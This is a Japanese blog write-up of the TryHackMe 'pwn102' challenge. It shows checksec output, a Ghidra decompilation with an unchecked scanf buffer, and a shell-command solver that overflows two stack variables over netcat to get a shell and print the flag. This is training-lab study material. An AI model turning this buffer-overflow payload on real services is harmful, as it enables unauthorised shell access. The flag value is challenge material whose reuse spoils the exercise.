---
title: TryHackMe PWN101 Writeup (2) PWN102
pubDatetime: 2026-04-25T02:00:00+09:00
description: TryHackMe PWN101 Challenge 2のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

```shellsession
$ file pwn102-1644307392479.pwn102
pwn102-1644307392479.pwn102: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2612b87a7803e0a8af101dc39d860554c652d165, not stripped
```

## checksec

```shellsession
$ .venv/bin/pwn checksec pwn102-1644307392479.pwn102
[*] '/home/hat0uma/work/pwn102-1644307392479.pwn102'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

```

## 実行

よくわからん

```shellsession
./pwn102-1644307392479.pwn102
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 102

I need badf00d to fee1dead
Am I right? a
I'm feeling dead, coz you said I need bad food :(

```

## Ghidra

狙った値にバッファオーバーフローさせる

```c

void main(void)

{
  undefined1 local_78 [104];
  int local_10;
  int local_c;

  setup();
  banner();
  local_c = 0xbadf00d;
  local_10 = -0x11e2153;
  printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead);
  __isoc99_scanf(&DAT_00100b66,local_78);
  if ((local_c == 0xc0ff33) && (local_10 == 0xc0d3)) {
    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
    system("/bin/sh");
    return;
  }
  puts("I\'m feeling dead, coz you said I need bad food :(");
                    /* WARNING: Subroutine does not return */
  exit(0x539);
}

```

## solver

```shellsession
root@ip-10-144-107-4:~# printf "%0104d" 0 > test.bin
root@ip-10-144-107-4:~# echo -en "\xd3\xc0\x00\x00" >> test.bin
root@ip-10-144-107-4:~# echo -en "\x33\xff\xc0\x00" >> test.bin
root@ip-10-144-107-4:~# hexdump -C test.bin
00000000  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
*
00000060  30 30 30 30 30 30 30 30  d3 c0 00 00 33 ff c0 00  |00000000....3...|
00000070
root@ip-10-144-107-4:~# cat test.bin - | nc 10.144.129.186 9002
       \u250c\u252c\u2510\u252c\u2500\u2510\u252c \u252c\u252c \u252c\u250c\u2500\u2510\u250c\u2500\u2510\u252c\u250c\u2500\u250c\u252c\u2510\u250c\u2500\u2510
        \u2502 \u251c\u252c\u2518\u2514\u252c\u2518\u251c\u2500\u2524\u251c\u2500\u2524\u2502  \u251c\u2534\u2510\u2502\u2502\u2502\u251c\u2524
        \u2534 \u2534\u2514\u2500 \u2534 \u2534 \u2534\u2534 \u2534\u2514\u2500\u2518\u2534 \u2534\u2534 \u2534\u2514\u2500\u2518
                 pwn 102

I need badf00d to fee1dead
Am I right?
Yes, I need c0ff33 to c0d3
ls
flag.txt
pwn102
pwn102.c
cat flag.txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
^C
```
